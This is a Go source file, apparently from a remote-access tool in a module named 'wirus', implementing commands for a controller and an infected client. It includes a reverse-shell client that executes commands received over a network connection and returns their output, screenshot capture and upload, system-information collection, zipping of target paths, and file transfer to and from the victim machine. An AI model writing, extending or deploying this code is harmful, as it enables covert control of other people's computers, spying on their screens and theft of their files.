package commands

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
	"wirus/utils"
	"github.com/schollz/progressbar/v3"
	"github.com/zcalusic/sysinfo"
)

func Zip(conn net.Conn, filePath string) error {
	err := utils.Zip(filePath)
	if err != nil {
		WriteString(conn, "error")
		return err
	}
	WriteString(conn, "done")
	return err
}

func SendZip(conn net.Conn, filePath string) error {
	WriteString(conn, "zip " + filePath)
	done, err := ReadString(conn)
	fmt.Println(done)
	return err
}

func ReciveBytesToFile(conn net.Conn, filePath string, size int) error {
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Printf("OS. Create() function execution error, error is:% v \n", err)
		return err
	}
	defer file.Close()

	var bytes_recived int
	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		bytes_recived += n
		file.Write(buf[:n])
		//	fmt.Println("write to file", n_sum, fileSizeInt )
		if bytes_recived == size {
			fmt.Println("file transfer completed")
			return nil
		}
		if err != nil {
			return err
		}
	}
}

func SendScreenshot(conn net.Conn) error {
	bytesBuffer := utils.ScreenShotToBytes()
	WriteString(conn, strconv.Itoa(bytesBuffer.Len()))
	ReadString(conn)

	buf := make([]byte, 1024)
	bytesSended := 0
	for {
		n, err := bytesBuffer.Read(buf)
		bytesSended += n
		if err != nil {
			if err == io.EOF {
				fmt.Println("sending file completed")
				return nil
			} else {
				fmt.Println("file. Read() method execution error, error is:% v \n", err)
				return err
			}
		}
		_, err = conn.Write(buf[:n])
		if err != nil {
			fmt.Printf("conn.Write() method execution error, error is:% v \n", err)
			return err
		}
	}
}

func ReciveScreenshot(conn net.Conn) error {
	WriteString(conn, "screenshot")
	fileSize, _ := ReadString(conn)
	fmt.Println("fileSize:", fileSize)
	fileSizeInt, _ := strconv.Atoi(fileSize)
	WriteString(conn, "ready")

	// current time in dd_mm_yyyy_hh_mm_ss
	currentTime := time.Now()
	formatedTime := currentTime.Format("15_04_05__01_02_2006")
	fileName := "screenshot_" + formatedTime + ".png"
	err := ReciveBytesToFile(conn, fileName, fileSizeInt)
	return err
}

func ProgressBar(steps int, current chan int) {
	bar := progressbar.New(steps)
	for progress := range current {
		bar.Add(progress)
	}
}

func ReadString(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	var buf [2048]byte
	n, err := reader.Read(buf[:])
	if err != nil {
		return "", err
	}
	recvStr := string(buf[:n])
	return recvStr, nil
}

func WriteString(conn net.Conn, message string) error {
	_, err := conn.Write([]byte(message))
	return err
}

func SendFile(conn net.Conn, sendingPath string, destination string) error {
	current := make(chan int)
	WriteString(conn, "file-send " + destination) // initiate file transfer
	ReadString(conn)              // wait for response for ready


	file, err := os.Open(sendingPath)
	if err != nil {
		fmt.Printf("OS. Open() function execution error, error is:% v  n", err)
		return err
	}
	defer file.Close()

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()
	WriteString(conn, strconv.FormatInt(fileSize, 10)) // send file size
	ReadString(conn)                                   // wait for response for ready

	var bytes_sended int
	buf := make([]byte, 1024)
	go ProgressBar(int(fileSize), current)
	for {
		n, err := file.Read(buf)
		bytes_sended += n
		current <- n
		if err != nil {
			if err == io.EOF {
				fmt.Println("sending file completed")
			} else {
				fmt.Println("file. Read() method execution error, error is:% v \n", err)
			}
			return err
		}
		_, err = conn.Write(buf[:n])
		if err != nil {
			fmt.Printf("conn.Write() method execution error, error is:% v \n", err)
			return err
		}
	}
}

func RecvFile(conn net.Conn, destination string) error {
	WriteString(conn, "RecvFile") //send sending have started
	fmt.Println("fileName:", destination)

	WriteString(conn, "FileSize")
	fileSize, _ := ReadString(conn)
	fmt.Println("fileSize:", fileSize)
	WriteString(conn, "Ready")

	fileSizeInt, _ := strconv.Atoi(fileSize)
	file, err := os.Create(destination)
	if err != nil {
		fmt.Printf("OS. Create() function execution error, error is:% v \n", err)
		return err
	}
	defer file.Close()

	var bytes_recived int
	//Read data from network and write to local file
	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		bytes_recived += n
		file.Write(buf[:n])
		//	fmt.Println("write to file", n_sum, fileSizeInt )
		if bytes_recived == fileSizeInt {
			fmt.Println("file transfer completed")
			return nil
		}
		if err != nil {
			return err
		}
	}
}

func ReciveInfo(conn net.Conn) error {
	WriteString(conn, "info")
	info, err := ReadString(conn)
	fmt.Println(info)
	return err
}

func SendInfo(conn net.Conn) error {
	var si sysinfo.SysInfo
	si.GetSysInfo()
	data, _ := json.MarshalIndent(&si, "", "  ")
	_, err := conn.Write([]byte(string(data)))
	return err
}

func ReverseShellClient(conn net.Conn) error{
	fmt.Println("Reverse shell client started")
	for {
		cmd, err := ReadString(conn)
		if err != nil {
			return err
		}
		if cmd == "EXIT" {
			return nil
		}
		cmd = strings.Replace(cmd, "\n", "", -1)
		fmt.Println("cmd:", cmd)
		out, _ := exec.Command(strings.TrimSuffix(cmd, "\n")).Output()
		WriteString(conn, string(out))
		fmt.Println("out:", string(out))
	}
}

func ReverseShellServer(conn net.Conn) error {
	WriteString(conn, "reverse-shell")
	fmt.Println("Reverse shell is starting...")
	fmt.Println("Write EXIT to exit")

	reader := bufio.NewReader(os.Stdin)
	for {
		cmd, err := reader.ReadString('\n')
		print(cmd, "command")
		WriteString(conn, cmd)
		fmt.Println("sended")
		if err != nil {
			fmt.Println("error:", err)
			return err
		}
		if cmd == "EXIT\n" {
			WriteString(conn, "EXIT")
			return nil
		}
		cmd_recived, _ := ReadString(conn)
		fmt.Println(cmd_recived)
	}
		
	}